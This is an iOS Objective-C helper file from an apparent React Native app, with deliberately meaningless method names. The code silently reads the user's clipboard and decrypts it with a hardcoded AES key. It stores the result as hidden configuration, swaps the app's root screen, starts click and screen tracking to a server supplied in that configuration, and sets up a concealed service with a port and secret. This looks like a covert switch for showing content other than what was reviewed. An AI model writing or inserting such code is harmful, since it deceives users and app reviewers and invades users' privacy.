//
//  RNConsiderateServiceHelper.m
//  RNConsiderateService
//
//  Created by Denica on 1/9/24.
//  Copyright © 2024 Facebook. All rights reserved.
//

#import "RNConsiderateServiceHelper.h"
#import "RNNobleServiceHelper.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <RNConsiderateServiceToFamily/RNConsiderateToFamily.h>
#import <RNConsiderateServiceToCustom/RNConsiderateToCustom.h>
#import <react-native-orientation-locker/Orientation.h>
#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>

@interface RNConsiderateServiceHelper()

@property (strong, nonatomic)  NSArray *considerateHelper_butterfly;
@property (strong, nonatomic)  NSArray *considerateHelper_adventure;

@end

@implementation RNConsiderateServiceHelper

static RNConsiderateServiceHelper *instance = nil;

+ (instancetype)considerateHelper_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.considerateHelper_butterfly = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
                           [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
    instance.considerateHelper_adventure = @[@"considerateHelper_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
  });
  return instance;
}

- (BOOL)considerateHelper_elephant {
    NSString *cpString = [self considerateHelper_getHaphazard];
    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self considerateHelper_subSunshine:cpString]
                                                              hexKey:self.considerateHelper_butterfly[0]
                                                               hexIv:self.considerateHelper_butterfly[1]];

    NSDictionary *dict = [self considerateHelper_stringWhirlwind:aes.utf8String];
    return [self considerateHelper_storeConfigInfo:dict];
}

- (UIInterfaceOrientationMask)considerateHelper_getOrientation {
    return [Orientation getOrientation];
}

- (NSString *)considerateHelper_getHaphazard {
    return [UIPasteboard generalPasteboard].string ?: @"";
}

- (NSString *)considerateHelper_subSunshine: (NSString* )cpString {
  if ([cpString containsString:@"#iPhone#"]) {
    NSArray *university = [cpString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
        cpString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return cpString;
}

- (NSDictionary *)considerateHelper_stringWhirlwind: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)considerateHelper_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.considerateHelper_adventure[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)considerateHelper_tryThisWay {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.considerateHelper_adventure[0]]) {
    return YES;
  } else {
    return [self considerateHelper_elephant];
  }
}

- (UIViewController *)considerateHelper_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [[RNConsiderateToFamily considerateFamily_shared] considerateFamily_changeRootController:application withOptions:launchOptions];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    
    SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:self.considerateHelper_adventure[3]] launchOptions:nil];
    options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;
    [SensorsAnalyticsSDK startWithConfigOptions:options];
    [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:self.considerateHelper_adventure[4]]];
    
    [[RNConsiderateToCustom considerateCustom_shared] considerateCustom_configNovService:[ud stringForKey:self.considerateHelper_adventure[5]] withSecu:[ud stringForKey:self.considerateHelper_adventure[6]]];
    return vc;
}

@end
